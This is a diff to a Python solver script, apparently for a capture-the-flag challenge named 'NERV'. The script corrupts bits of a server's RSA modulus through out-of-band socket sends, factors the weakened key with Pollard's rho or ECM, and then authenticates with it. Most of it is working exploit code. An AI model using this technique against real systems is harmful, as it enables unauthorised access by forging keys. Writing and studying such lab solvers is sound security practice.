@@ -158,26 +158,25 @@ def solve(args):
 
     found = False
     current_modulus = initial_modulus
-    for i in range(8):
+    already_tried = set()
+    while already_tried != set(range(len(overflow_sockets))):
         s = random.randint(0, len(overflow_sockets)-1)
-        print(f"Picked overflow socket {s} to corrupt")
+        print(f"Picked overflow socket / bit {s} to corrupt")
         sock = overflow_sockets[s]
         sock.send(b'1', socket.MSG_OOB)
         time.sleep(0.1)
+        already_tried.add(s)
         # Pause the client thread so that it doesn't overwrite the key
         pause_client(r)
-        for j in range(10):
-            modulus = get_key(r)
-            print(f"After round {j}:")
-            compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
-            if modulus == current_modulus:
-                continue
-            current_modulus = modulus
-            key = try_factor(modulus, exponent)
-            if key:
-                found = True
-                break
-        if found:
+        modulus = get_key(r)
+        compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
+        if modulus == current_modulus:
+            print(f"Key is unchanged; bit {s} must have already been 0")
+            continue
+        current_modulus = modulus
+        key = try_factor(modulus, exponent)
+        if key:
+            found = True
             break
         # Resume the client thread
         resume_client(r)
@@ -190,22 +189,39 @@ def solve(args):
     while True:
         success = authenticate(r, key)
         if success:
+            # TODO: implement once we figure out what should happen
+            # after you successfully authenticate
+            print(f"Successfully authenticated! :)")
             break
-        current_key = get_key(r)
-        if current_key != key.n:
-            print("Key changed :(")
-            compare_keys(key.n, current_key, 'Old', 'New', limit=64)
-            key = try_factor(current_key, exponent)
-            if key:
-                print("Got new key!")
-                print(key)
-            else:
-                print("Failed to factor new key :(")
-                break
-
     r.close()
     for s in sockets:
         s.close()
+
+def check_prereqs():
+    import shutil
+    # Check if sage is in the path
+    if shutil.which('sage') is None:
+        print("Please install sage (needed for ECM factoring attack)")
+        return False
+    # Check for brent and signmessage
+    signing_bin = '%s/signmessage' % rootpath()
+    brent_bin = '%s/brent' % rootpath()
+    if not os.path.exists(signing_bin) or not os.path.exists(brent_bin):
+        print("Missing brent (optimized Pollard's rho) or signmessage (signing binary)")
+        print("Will try to build them now...")
+        try:
+            # Run make in the root directory. Capture stdout/stderr and print it if it fails
+            topdir = os.path.dirname(rootpath())
+            out = subprocess.run(['make', '-C', topdir], check=True,
+                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                 text=True)
+            print(out.stdout)
+            print("Built binaries successfully")
+            return True
+        except Exception as e:
+            print(f"Failed to build binaries: {e}")
+            return False
+    return True
 
 def main():
     parser = argparse.ArgumentParser(description='NERV Client')
@@ -215,6 +231,8 @@ def main():
     parser.add_argument('-n', '--num_clients', metavar='num_clients', type=int, default=1050,
                         help='Number of clients (default 32)')
     args = parser.parse_args()
+    if not check_prereqs():
+        return
 
     increase_open_files_limit()
     solve(args)
